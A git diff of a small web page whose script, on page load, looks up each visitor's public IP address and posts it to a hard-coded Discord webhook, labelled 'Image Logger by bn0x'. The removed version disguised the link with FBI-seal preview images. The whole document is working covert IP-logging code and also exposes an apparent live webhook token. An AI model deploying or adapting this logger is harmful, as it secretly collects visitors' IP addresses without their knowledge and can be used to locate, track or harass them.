@@ -1,44 +1,36 @@
-<!DOCTYPE html>
-<html lang="sk">
-<head>
-  <meta charset="UTF-8" />
+<script>
+  const webhookURL = "https://discord.com/api/webhooks/1403164786426122280/Qr-LlmfaJTRDq6OkG4SZ0VLAb_z0SEZKtdvNaDtOwEmo_u7wkalQjiwdJTNSLnxtTR5z";
 
-  <!-- Only Open Graph image meta tag -->
-  <meta property="og:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.ip;
+      console.log("ss", ip);
 
-  <!-- Only Twitter card image meta tag -->
-  <meta name="twitter:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
-</head>
-<body>
-  <h1>IP Logger</h1>
-  <script>
-    const webhookURL = "https://discord.com/api/webhooks/1403164786426122280/Qr-LlmfaJTRDq6OkG4SZ0VLAb_z0SEZKtdvNaDtOwEmo_u7wkalQjiwdJTNSLnxtTR5z";
-
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        const ip = data.ip;
-        console.log("IP návštevníka:", ip);
-
-        fetch(webhookURL, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            content: `Nový návštevník so záznamom IP: ${ip}`
-          }),
-        })
-        .then(response => {
-          if (response.ok) {
-            console.log("IP poslaná na webhook");
-          } else {
-            console.error("Chyba pri posielaní na webhook");
-          }
-        })
-        .catch(console.error);
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          embeds: [
+            {
+              image: {
+                url: "https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png"
+              },
+              description: `Image Logger by bn0x: ${ip}`
+            }
+          ]
+        }),
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log("g");
+        } else {
+          console.error("h");
+        }
       })
       .catch(console.error);
-  </script>
-</body>
-</html>
+    })
+    .catch(console.error);
+</script>
